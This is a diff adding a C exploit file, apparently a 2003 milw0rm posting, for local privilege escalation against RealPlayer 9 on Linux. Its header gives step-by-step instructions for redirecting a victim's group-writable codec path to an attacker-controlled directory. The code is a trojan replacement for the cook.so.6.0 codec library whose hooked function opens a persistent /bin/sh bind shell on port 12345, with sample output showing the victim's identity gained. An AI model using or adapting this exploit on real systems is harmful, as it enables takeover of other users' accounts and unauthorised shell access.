@@ -1,0 +1,160 @@
+/**
+ * rp9-priv-esc.c 
+ *
+ * A local privilege escalation attack against the community supported
+ * version of Real.com's Realplayer, version 9.
+ *
+ * Written by:
+ * 	
+ * 	Jon Hart warchild spoofed.org
+ *
+ * By default, configuration files are stored in ~$USER/.realnetworks/, 
+ * but all the files in there are group writeable.  So long as ~$USER 
+ * has group execution permissions (which is pretty common), a malicious
+ * local user can edit the config files of fellow users to do his biddings.  
+ *
+ * There are a number of ways to attack this, but after some poking it seems
+ * that modifying the path to shared libraries and writing my own malicious
+ * shared libraries was the easiest.  
+ * 
+ * (as an aside, just because the shared libraries in the directories contained
+ * in ~$USER/.realnetworks/RealShared_0_0/ are stripped doesn't mean we can't get 
+ * the symbols back.  objdump quickly can tell us what the names of the 15 
+ * functions are, and we can stub out a bogus shared library pretty quickly.)
+ *
+ * This particular bit of code is meant to replace the shared library 
+ * cook.so.6.0, which is contained in the Codecs directory.  To execute this 
+ * attack against a fellow local user, first edit their config file 
+ * (~victim/.realnetworks/RealShared_0_0) to have the 'dt_codecs' variable
+ * point to a directory under your control, like /tmp/Codecs.  Copy all of the 
+ * existing files from the previous value of dt_codecs (which is usually something
+ * like ~victim/Real/Codecs/) to /tmp/Codecs.  Next, compile the code below as a
+ * shared library and copy it to the trojaned directory:
+ *
+ * 
+ * `gcc -shared -fPIC -o /tmp/Codecs/cook.so.6.0 rp9-priv-esc.c`
+ *
+ *	The next time the victim fires up realplayer 9, a nice little shell 
+ * will be listening on port 12345 for you:
+ *
+ * guest@haiti:/$ id
+ * uid=1006(guest) gid=100(users) groups=100(users)
+ * guest@haiti:/$ nc localhost 12345
+ * id
+ * uid=1000(warchild) gid=100(users) groups=100(users),40(src),1003(wheel)
+ *
+ * Of course, you don't have to execute a shell.  Do whatever makes you happy.
+ *
+ * Fix?  `chmod 700 ~/.realnetworks/*`
+ *
+ *  Copyright (c) 2003, Jon Hart 
+ * All rights reserved.
+ *
+ *  Redistribution and use in source and binary forms, with or without modification, 
+ *  are permitted provided that the following conditions are met:
+ *
+ *  * Redistributions of source code must retain the above copyright notice, 
+ *    this list of conditions and the following disclaimer.
+ *  * Redistributions in binary form must reproduce the above copyright notice, 
+ *    this list of conditions and the following disclaimer in the documentation 
+ *    and/or other materials provided with the distribution.
+ *  * Neither the name of the organization nor the names of its contributors may
+ *    be used to endorse or promote products derived from this software without 
+ *    specific prior written permission.
+ *
+ *
+ *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
+ *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+ *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+ *  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
+ *  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
+ *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
+ *  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
+ *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
+ *  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE 
+ *  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ *
+ *
+ *
+ *
+ */
+#define PORT 12345
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+
+void RAInitEncoder(void) { }
+/** This just happens to be one of the first 
+ * functions that realplayer calls after cook.so.6.0 is loaded
+ */
+void RAOpenCodec2(void) { cookthis(); }
+void RAOpenCodec(void) {  }
+void RAGetNumberOfFlavors(void) {  }
+void RACloseCodec(void) {  }
+void RADecode(void) {  }
+void RAEncode(void) {  }
+void RAFreeEncoder(void) {  }
+void RAGetNumberOfFlavors2(void) {  }
+void RAFreeDecoder(void) {  }
+void RAFlush(void) {  }
+void RAGetFlavorProperty(void) {  }
+void G2(void) { }
+void RASetFlavor(void) {  }
+void RAInitDecoder(void) {  }
+void RACreateEncoderInstance(void) { }
+
+/* Bind /bin/sh to PORT.  It forks
+ * and all that good stuff, so it won't 
+ * easily go away.
+ */
+int cookthis() {
+
+
+        int sock_des, sock_client, sock_recv, sock_len, server_pid, client_pid;
+        struct sockaddr_in server_addr; 
+        struct sockaddr_in client_addr;
+
+        if ((sock_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
+                exit(EXIT_FAILURE); 
+
+        bzero((char *) &server_addr, sizeof(server_addr));
+        server_addr.sin_family = AF_INET; 
+        server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+        server_addr.sin_port = htons(PORT);
+
+        if ((sock_recv = bind(sock_des, (struct sockaddr *) &server_addr, sizeof(server_addr))) != 0) 
+                exit(EXIT_FAILURE); 
+        if (fork() != 0) 
+                exit(EXIT_SUCCESS); 
+        setpgrp();  
+        signal(SIGHUP, SIG_IGN); 
+        if (fork() != 0) 
+                exit(EXIT_SUCCESS); 
+        if ((sock_recv = listen(sock_des, 5)) != 0)
+                exit(EXIT_SUCCESS); 
+        while (1) { 
+                sock_len = sizeof(client_addr);
+                if ((sock_client = accept(sock_des, (struct sockaddr *) &client_addr, &sock_len)) < 0)
+                        exit(EXIT_SUCCESS); 
+                client_pid = getpid(); 
+                server_pid = fork(); 
+                if (server_pid != 0) { 
+                        dup2(sock_client,0); 
+                        dup2(sock_client,1); 
+                        dup2(sock_client,2);
+
+                        execl("/bin/sh","realplay",(char *)0); 
+                        close(sock_client); 
+                        exit(EXIT_SUCCESS); 
+                } 
+                close(sock_client);
+        }
+}
+
+
+
+
+// milw0rm.com [2003-09-09]
